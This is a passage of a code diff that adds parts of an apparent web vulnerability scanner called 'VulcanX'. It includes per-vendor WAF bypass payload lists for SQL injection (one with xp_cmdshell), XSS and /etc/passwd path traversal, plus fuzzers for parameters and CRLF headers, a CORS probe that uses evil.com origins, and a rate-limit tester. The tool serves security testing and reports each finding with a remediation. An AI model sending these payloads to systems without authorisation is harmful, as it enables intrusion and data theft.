+                    "1'%20OR%20'1'='1",
+                    "1') OR ('1'='1",
+                    "1' OR 1=1--+",
+                ],
+                'xss': [
+                    "<svg onload=alert(1)>",
+                    "<math><mtext></p><script>alert(1)</script>",
+                    "<input autofocus onfocus=alert(1)>",
+                ],
+                'lfi': [
+                    "....//....//etc/passwd",
+                    "..\\..\\..\\etc\\passwd",
+                    "%2e%2e%5cetc%5cpasswd",
+                ],
+            },
+            'ModSecurity': {
+                'sqli': [
+                    "1' /*!UNION*/ /*!SELECT*/ NULL--",
+                    "1'%20/*!50000UNION*/%20SELECT%20NULL--",
+                    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+                    "1';WAITFOR DELAY '0:0:5'--",
+                ],
+                'xss': [
+                    "<scr\x00ipt>alert(1)</script>",
+                    "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">'",
+                    "\"><ScRiPt>alert(1)</ScRiPt>",
+                    "<a href=\"javascript:void(alert(1))\">Click</a>",
+                ],
+                'lfi': [
+                    "..%c0%af..%c0%afetc%c0%afpasswd",
+                    "/%2e%2e/%2e%2e/etc/passwd",
+                    "/....//....//etc/passwd",
+                ],
+            },
+            'Imperva': {
+                'sqli': [
+                    "1' OR 'unusual'='unusual",
+                    "1'||'1'='1",
+                    "1' AND SLEEP(5)--",
+                    "1);SELECT pg_sleep(5)--",
+                ],
+                'xss': [
+                    r"<svg><script>alert(1)<\/script>",
+                    "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+                    "<body/onload=&Tab;alert(1)>",
+                    "<iframe onload=alert(1) src=data:text/html,>",
+                ],
+                'lfi': [
+                    "%252e%252e%252fetc%252fpasswd",
+                    "..%25%32%66..%25%32%66etc%25%32%66passwd",
+                    "/..%5c..%5c..%5cetc%5cpasswd",
+                ],
+            },
+            'F5 BigIP': {
+                'sqli': [
+                    "1'%20UNION%20SELECT%20NULL--",
+                    "1' AND 1=1 LIMIT 1--",
+                    "1' OR SLEEP(5)--",
+                    "'; EXEC xp_cmdshell('whoami')--",
+                ],
+                'xss': [
+                    "<script>alert(1)</script>",
+                    "<img src=1 onerror=alert(1)>",
+                    "<details/open/ontoggle=alert(1)>",
+                    "\";alert(1)//",
+                ],
+                'lfi': [
+                    "..%2f..%2f..%2fetc%2fpasswd",
+                    "....//....//etc//passwd",
+                    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+                ],
+            },
+            'Generic WAF': {
+                'sqli': [
+                    "1' OR '1'='1",
+                    "1/**/UNION/**/SELECT/**/NULL--",
+                    "1'%0AUNION%0ASELECT%0ANULL--",
+                ],
+                'xss': [
+                    "<svg/onload=alert(1)>",
+                    "<img src=x onerror=alert(1)>",
+                    "<details open ontoggle=alert(1)>",
+                ],
+                'lfi': [
+                    "../etc/passwd",
+                    "..%2fetc%2fpasswd",
+                    "%252e%252e%252fetc%252fpasswd",
+                ],
+            },
+        }
+
+        vendor_map = payloads.get(waf_name, payloads.get('Generic WAF', {}))
+        output_lines = [f"[WAF Bypass Payloads for {waf_name}]"]
+
+        types_to_show = ['sqli', 'xss', 'lfi'] if payload_type == 'all' else [payload_type]
+        for ptype in types_to_show:
+            if ptype in vendor_map:
+                output_lines.append(f"\n{ptype.upper()} Bypasses:")
+                for p in vendor_map[ptype]:
+                    output_lines.append(f"  - {p}")
+
+        return '\n'.join(output_lines)
+
+    # ------------------------------------------------------------------
+    # FUZZER DIFF ENGINE
+    # ------------------------------------------------------------------
+    def baseline_fuzz(self, url, param, payloads, method='GET', headers=None, body=None):
+        """
+        Sends a clean baseline request then replays with each payload, comparing
+        status code, response time, and body length to detect injection.
+
+        Args:
+            url     : Target URL (may already contain param in query string).
+            param   : Parameter name to fuzz.
+            payloads: List of payload strings to inject.
+            method  : HTTP method ('GET' or 'POST').
+            headers : Optional dict of extra request headers.
+            body    : Optional base request body string (for POST).
+
+        Returns: list of Finding dicts.
+        """
+        if _requests is None:
+            return []
+
+        findings = []
+        session = _requests.Session()
+        req_headers = {'User-Agent': 'VulcanX-Fuzzer/1.0'}
+        if headers:
+            req_headers.update(headers)
+
+        def _inject(param_val):
+            """Build request args with payload injected into param."""
+            if method.upper() == 'GET':
+                parsed = urllib.parse.urlparse(url)
+                qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+                qs[param] = [param_val]
+                new_query = urllib.parse.urlencode(qs, doseq=True)
+                target = urllib.parse.urlunparse(parsed._replace(query=new_query))
+                return dict(url=target, params=None, data=None)
+            else:
+                base_body = body or ''
+                stripped = base_body.strip()
+                if stripped.startswith('{'):
+                    try:
+                        obj = json.loads(stripped)
+                        obj[param] = param_val
+                        return dict(url=url, params=None, data=None,
+                                    json=obj)
+                    except Exception:
+                        pass
+                qs = urllib.parse.parse_qs(stripped, keep_blank_values=True)
+                qs[param] = [param_val]
+                return dict(url=url, params=None,
+                            data=urllib.parse.urlencode(qs, doseq=True))
+
+        # --- Baseline ---
+        try:
+            baseline_args = _inject('')
+            t0 = time.time()
+            resp = session.request(method.upper(), headers=req_headers,
+                                   timeout=15, **baseline_args)
+            baseline_time = time.time() - t0
+            baseline_status = resp.status_code
+            baseline_len = len(resp.text)
+        except Exception as e:
+            findings.append({
+                'url': url, 'type': 'FUZZER_ERROR', 'severity': 'INFO',
+                'description': f'Baseline request failed: {e}',
+                'remediation': 'Check target availability.',
+                'match': param, 'context': str(e), 'line': 0, 'source': 'FUZZER'
+            })
+            return findings
+
+        # --- Fuzz each payload ---
+        for payload in payloads:
+            try:
+                fuzz_args = _inject(payload)
+                t0 = time.time()
+                fuzz_resp = session.request(method.upper(), headers=req_headers,
+                                            timeout=20, **fuzz_args)
+                elapsed = time.time() - t0
+            except Exception:
+                continue
+
+            delta_time = elapsed - baseline_time
+            status_changed = fuzz_resp.status_code != baseline_status
+            fuzz_len = len(fuzz_resp.text)
+            body_pct_change = abs(fuzz_len - baseline_len) / max(baseline_len, 1)
+            payload_reflected = payload in fuzz_resp.text
+
+            # 1. Blind Time-based Injection (>4s delay)
+            if delta_time > 4.0:
+                findings.append({
+                    'url': url, 'type': 'BLIND_TIME_INJECTION',
+                    'severity': 'HIGH',
+                    'description': (
+                        f'Time-based blind injection detected on param "{param}". '
+                        f'Baseline: {baseline_time:.2f}s, Fuzz: {elapsed:.2f}s '
+                        f'(delta +{delta_time:.2f}s).'
+                    ),
+                    'remediation': 'Use parameterised queries / prepared statements.',
+                    'match': payload,
+                    'context': f'Param={param}, Method={method}, Delta={delta_time:.2f}s',
+                    'line': 0, 'source': 'FUZZER'
+                })
+
+            # 2. Status code change
+            if status_changed:
+                findings.append({
+                    'url': url, 'type': 'FUZZ_STATUS_CHANGE',
+                    'severity': 'MEDIUM',
+                    'description': (
+                        f'HTTP status changed on param "{param}": '
+                        f'{baseline_status} -> {fuzz_resp.status_code}.'
+                    ),
+                    'remediation': 'Investigate why the payload triggers a different response code.',
+                    'match': payload,
+                    'context': f'Baseline={baseline_status}, Fuzz={fuzz_resp.status_code}',
+                    'line': 0, 'source': 'FUZZER'
+                })
+
+            # 3. Significant body size change (>20%)
+            if body_pct_change > 0.20 and not status_changed:
+                findings.append({
+                    'url': url, 'type': 'FUZZ_BODY_DIFF',
+                    'severity': 'MEDIUM',
+                    'description': (
+                        f'Response body size changed significantly for param "{param}": '
+                        f'{baseline_len} -> {fuzz_len} bytes '
+                        f'({body_pct_change*100:.1f}% change).'
+                    ),
+                    'remediation': 'Investigate differential response; may indicate error-based injection.',
+                    'match': payload,
+                    'context': f'Baseline={baseline_len}B, Fuzz={fuzz_len}B',
+                    'line': 0, 'source': 'FUZZER'
+                })
+
+            # 4. Payload reflection
+            if payload_reflected:
+                findings.append({
+                    'url': url, 'type': 'FUZZ_PAYLOAD_REFLECTED',
+                    'severity': 'MEDIUM',
+                    'description': f'Payload reflected in response for param "{param}".',
+                    'remediation': 'Sanitise and encode all user-supplied output; may indicate XSS.',
+                    'match': payload,
+                    'context': fuzz_resp.text[max(0, fuzz_resp.text.find(payload)-60):
+                                              fuzz_resp.text.find(payload)+60+len(payload)],
+                    'line': 0, 'source': 'FUZZER'
+                })
+
+        self.findings.extend(findings)
+        return findings
+
+    # ------------------------------------------------------------------
+    # HEADER INJECTION FUZZER
+    # ------------------------------------------------------------------
+    def fuzz_headers(self, url, payloads=None):
+        """
+        Fuzzes a set of common HTTP request headers with CRLF/injection payloads.
+        Checks for reflection in response, 5xx errors, and time delays.
+
+        Returns: list of Finding dicts.
+        """
+        if _requests is None:
+            return []
+
+        default_payloads = [
+            "127.0.0.1",
+            "localhost",
+            "\r\nX-Injected: vulcanx",
+            "127.0.0.1\r\nSet-Cookie: vulcanx=1",
+            "0\r\n\r\nHTTP/1.1 200 OK\r\n\r\n<html>injected</html>",
+            "' OR '1'='1",
+            "<script>alert(1)</script>",
+            "%0d%0aX-Injected: vulcanx",
+            "../etc/passwd",
+        ]
+        payloads = payloads or default_payloads
+
+        target_headers = [
+            'X-Forwarded-For',
+            'X-Originating-IP',
+            'X-Remote-IP',
+            'Referer',
+            'User-Agent',
+            'X-Host',
+            'X-Real-IP',
+        ]
+
+        findings = []
+        session = _requests.Session()
+
+        # Baseline
+        try:
+            t0 = time.time()
+            baseline = session.get(url, timeout=10,
+                                   headers={'User-Agent': 'VulcanX-Fuzzer/1.0'})
+            baseline_time = time.time() - t0
+            baseline_body = baseline.text
+        except Exception as e:
+            findings.append({
+                'url': url, 'type': 'HEADER_FUZZ_ERROR', 'severity': 'INFO',
+                'description': f'Baseline request failed: {e}',
+                'remediation': 'Check connectivity.', 'match': '', 'context': str(e),
+                'line': 0, 'source': 'FUZZER'
+            })
+            return findings
+
+        for header in target_headers:
+            for payload in payloads:
+                try:
+                    t0 = time.time()
+                    resp = session.get(
+                        url, timeout=15,
+                        headers={
+                            'User-Agent': 'VulcanX-Fuzzer/1.0',
+                            header: payload,
+                        }
+                    )
+                    elapsed = time.time() - t0
+                except Exception:
+                    continue
+
+                delta = elapsed - baseline_time
+
+                # 1. CRLF Injection — newline chars reflected or header in response
+                if '\r\n' in payload or '%0d%0a' in payload.lower():
+                    injected_header_name = 'X-Injected'
+                    if injected_header_name.lower() in {k.lower() for k in resp.headers}:
+                        findings.append({
+                            'url': url, 'type': 'CRLF_INJECTION',
+                            'severity': 'HIGH',
+                            'description': (
+                                f'CRLF injection confirmed via header "{header}". '
+                                'Injected header appeared in response.'
+                            ),
+                            'remediation': 'Strip or reject CR/LF characters from all header inputs.',
+                            'match': payload,
+                            'context': f'Header: {header}, Injected: {injected_header_name}',
+                            'line': 0, 'source': 'FUZZER'
+                        })
+
+                # 2. Reflection in body
+                if payload in resp.text and payload not in baseline_body:
+                    findings.append({
+                        'url': url, 'type': 'HEADER_VALUE_REFLECTED',
+                        'severity': 'MEDIUM',
+                        'description': (
+                            f'Value from header "{header}" reflected in response body.'
+                        ),
+                        'remediation': 'Do not echo request headers into responses without sanitisation.',
+                        'match': payload,
+                        'context': resp.text[max(0, resp.text.find(payload)-40):
+                                             resp.text.find(payload)+40+len(payload)],
+                        'line': 0, 'source': 'FUZZER'
+                    })
+
+                # 3. 500 Internal Server Error
+                if resp.status_code >= 500:
+                    findings.append({
+                        'url': url, 'type': 'HEADER_TRIGGERS_500',
+                        'severity': 'MEDIUM',
+                        'description': (
+                            f'Header "{header}" with payload caused HTTP {resp.status_code}.'
+                        ),
+                        'remediation': 'Handle header values defensively; errors may leak info.',
+                        'match': payload,
+                        'context': f'Status: {resp.status_code}',
+                        'line': 0, 'source': 'FUZZER'
+                    })
+
+                # 4. Time delay (>4s)
+                if delta > 4.0:
+                    findings.append({
+                        'url': url, 'type': 'HEADER_TIME_DELAY',
+                        'severity': 'HIGH',
+                        'description': (
+                            f'Time delay detected when fuzzing header "{header}": '
+                            f'+{delta:.2f}s over baseline.'
+                        ),
+                        'remediation': 'Investigate backend processing of this header for blind injection.',
+                        'match': payload,
+                        'context': f'Delta={delta:.2f}s, Header={header}',
+                        'line': 0, 'source': 'FUZZER'
+                    })
+
+        self.findings.extend(findings)
+        return findings
+
+    # ------------------------------------------------------------------
+    # CORS SCANNER
+    # ------------------------------------------------------------------
+    def check_cors(self, url, headers=None):
+        """
+        Tests the target URL for CORS misconfigurations by probing with
+        known-malicious origin values.
+
+        Returns: list of Finding dicts.
+        """
+        if _requests is None:
+            return []
+
+        findings = []
+        session = _requests.Session()
+        req_headers = {'User-Agent': 'VulcanX-CORS/1.0'}
+        if headers:
+            req_headers.update(headers)
+
+        parsed = urllib.parse.urlparse(url)
+        target_origin = f"{parsed.scheme}://{parsed.netloc}"
+
+        test_origins = [
+            'https://evil.com',
+            'null',
+            f'https://{parsed.netloc}.evil.com',
+            f'https://evil{parsed.netloc}',
+        ]
+
+        for origin in test_origins:
+            try:
+                probe_headers = dict(req_headers)
+                probe_headers['Origin'] = origin
+                resp = session.get(url, headers=probe_headers, timeout=10)
+            except Exception:
+                continue
+
+            acao = resp.headers.get('Access-Control-Allow-Origin', '')
+            acac = resp.headers.get('Access-Control-Allow-Credentials', '').lower()
+
+            # 1. ACAO wildcard with credentials — CRITICAL
+            if acao == '*' and acac == 'true':
+                findings.append({
+                    'url': url, 'type': 'CORS_WILDCARD_WITH_CREDENTIALS',
+                    'severity': 'CRITICAL',
+                    'description': (
+                        'CORS misconfiguration: Access-Control-Allow-Origin: * combined with '
+                        'Access-Control-Allow-Credentials: true. This violates the spec and may '
+                        'allow any origin to read credentialed responses in certain browser/server combos.'
+                    ),
+                    'remediation': 'Never combine wildcard ACAO with credentials. Explicitly whitelist trusted origins.',
+                    'match': f'ACAO: {acao} / ACAC: {acac}',
+                    'context': f'Probe Origin: {origin}',
+                    'line': 0, 'source': 'CORS'
+                })
+
+            # 2. Null origin accepted — HIGH
+            elif origin == 'null' and acao == 'null':
+                findings.append({
+                    'url': url, 'type': 'CORS_NULL_ORIGIN_ACCEPTED',
+                    'severity': 'HIGH',
+                    'description': (
+                        'CORS misconfiguration: Server reflects "null" origin. '
+                        'Sandboxed iframes can be used to send null-origin requests, '
+                        'enabling cross-site data reads if credentials are included.'
+                    ),
+                    'remediation': 'Do not whitelist the null origin. Use an explicit allowlist of trusted domains.',
+                    'match': f'ACAO: {acao}',
+                    'context': f'Probe Origin: {origin}',
+                    'line': 0, 'source': 'CORS'
+                })
+
+            # 3. Attacker origin reflected — HIGH
+            elif acao and acao == origin and origin not in ('null', target_origin):
+                sev = 'CRITICAL' if acac == 'true' else 'HIGH'
+                findings.append({
+                    'url': url, 'type': 'CORS_ORIGIN_REFLECTION',
+                    'severity': sev,
+                    'description': (
+                        f'CORS misconfiguration: Server reflects attacker-controlled origin "{origin}" '
+                        f'in Access-Control-Allow-Origin. '
+                        + (f'Credentials are also allowed (ACAC: true), enabling full CSRF/session theft.' if acac == 'true' else '')
+                    ),
+                    'remediation': 'Validate Origin against a strict server-side allowlist. Never reflect arbitrary origins.',
+                    'match': f'ACAO: {acao}',
+                    'context': f'Probe Origin: {origin}, ACAC: {acac}',
+                    'line': 0, 'source': 'CORS'
+                })
+
+        self.findings.extend(findings)
+        return findings
+
+    # ------------------------------------------------------------------
+    # RATE LIMITING TESTER
+    # ------------------------------------------------------------------
+    def check_rate_limiting(self, url, method='POST', threshold=10):
+        """
+        Sends `threshold` rapid requests and checks for 429 / account lockout responses.
+        If no rate limiting is observed: emits a MEDIUM finding.
+
+        Returns: list of Finding dicts.
+        """
+        if _requests is None:
+            return []
+
+        findings = []
+        session = _requests.Session()
+        req_headers = {'User-Agent': 'VulcanX-RateTest/1.0'}
+
+        rate_limited = False
+        lockout_detected = False
+        status_codes = []
+
+        for i in range(threshold):
+            try:
+                resp = session.request(
+                    method.upper(), url,
+                    headers=req_headers,
+                    timeout=10
+                )
+                status_codes.append(resp.status_code)
+
+                if resp.status_code == 429:
+                    rate_limited = True
+                    break
+
+                # Lockout heuristics: account-locked phrases in body
+                body_lower = resp.text.lower()
+                if any(kw in body_lower for kw in
+                       ['account locked', 'too many attempts', 'temporarily blocked',
+                        'brute force', 'captcha required', 'rate limit']):
+                    lockout_detected = True
+                    break
+            except Exception:
+                break
+
+        if rate_limited:
+            findings.append({
+                'url': url, 'type': 'RATE_LIMITING_PRESENT',
+                'severity': 'INFO',
+                'description': f'Rate limiting (HTTP 429) triggered after {i+1}/{threshold} requests.',
+                'remediation': 'Rate limiting is working correctly.',
+                'match': f'HTTP 429 on request #{i+1}',
+                'context': f'Method={method}, Threshold={threshold}',
+                'line': 0, 'source': 'RATE_TEST'
+            })
+        elif lockout_detected:
+            findings.append({
+                'url': url, 'type': 'ACCOUNT_LOCKOUT_DETECTED',
+                'severity': 'INFO',
+                'description': f'Account lockout mechanism triggered after {i+1}/{threshold} requests.',
+                'remediation': 'Lockout detected; verify the lockout window and unlock procedure.',
+                'match': f'Lockout phrase on request #{i+1}',
+                'context': f'Method={method}, Threshold={threshold}',
+                'line': 0, 'source': 'RATE_TEST'
+            })
+        else:
+            findings.append({
+                'url': url, 'type': 'NO_RATE_LIMITING',
+                'severity': 'MEDIUM',
+                'description': (
+                    f'No rate limiting detected after {threshold} rapid {method} requests. '
+                    f'Status codes observed: {list(set(status_codes))}. '
+                    'This endpoint may be vulnerable to brute-force or credential-stuffing attacks.'
+                ),
+                'remediation': (
+                    'Implement rate limiting (e.g. token bucket, leaky bucket), '
+                    'account lockout after N failures, and CAPTCHA for sensitive endpoints.'
+                ),
+                'match': f'{threshold} requests, no 429/lockout',
+                'context': f'Method={method}, Status codes: {list(set(status_codes))}',
+                'line': 0, 'source': 'RATE_TEST'
+            })
+
+        self.findings.extend(findings)
+        return findings
+
+    def _flatten_json_params(self, obj, prefix=''):
+        """Yields (dotted.key, value) pairs from a parsed JSON body, recursing into dicts/lists."""
+        if isinstance(obj, dict):
+            for k, v in obj.items():
+                key = f'{prefix}.{k}' if prefix else k
+                if isinstance(v, (dict, list)):
+                    yield from self._flatten_json_params(v, key)
+                else:
+                    yield (k, v)
+        elif isinstance(obj, list):
+            for i, v in enumerate(obj):
+                key = f'{prefix}[{i}]'
+                if isinstance(v, (dict, list)):
+                    yield from self._flatten_json_params(v, key)
+                else:
+                    yield (prefix.rsplit('.', 1)[-1] if prefix else str(i), v)
 
     def _extract_api_map(self, url, content, source='STATIC'):
         """
